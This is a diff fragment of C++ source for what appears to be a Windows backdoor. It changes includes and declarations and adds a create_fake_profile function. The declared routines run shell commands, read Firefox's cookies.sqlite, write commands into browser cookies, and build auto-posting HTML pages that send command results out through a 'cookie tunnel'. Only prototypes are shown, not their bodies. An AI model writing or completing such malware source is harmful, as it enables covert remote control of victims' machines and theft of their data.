@@ -19,27 +19,33 @@ To compile:
 #include <ShellApi.h>
 #include <stdexcept>
 #include <sstream>
+#include <cstdint>
+#include <deque>
+#include <thread>
+#include "lib/mingw_thread.h"
 using namespace std;
 
-extern std::string domain;
 
-static const std::string base64_chars = 
+extern string domain;
+int Get_CMD_result(string CmdLine, string CmdRunDir, string& ListStdOut, string& ListStdErr, uint32_t&  RetCode);
+static const string base64_chars = 
              "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
              "abcdefghijklmnopqrstuvwxyz"
              "0123456789+/";
 
 static inline bool is_base64(unsigned char c);
-std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);
-std::string base64_decode(std::string const& encoded_string);	
-std::string readfile(const std::string &filepath); 
-std::string exec_command(std::string cmd); 
-std::string get_windows_username();
-std::string get_default_firefox_profiledir(const std::string& name);
-std::string get_firefox_sqlite_path();
+string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);
+string base64_decode(string const& encoded_string);	
+string readfile(const string &filepath); 
+string exec_command(string cmd); 
+string get_windows_username();
+string get_default_firefox_profiledir(const string& name);
+string get_firefox_sqlite_path();
 void write_cmd_cookie(); // write  cmd command in cookie
-void Write_File(std::string filename, std::string buf); 
-void construct_html(std::string result_cmd, std::string filename); // write html to auto js to POST, to send result of CMD
-void send_result_cmd(std::string html_file);
+void create_fake_profile(string name);
+void Write_File(string filename, string buf); 
+void construct_html(string result_cmd, string filename); // write html to auto js to POST, to send result of CMD
+void send_result_cmd(string html_file);
 static int callback(void *data, int argc, char **argv, char **azColName); // result of select query in cookies.sqlite
 void start_cookie_tunnel();
 
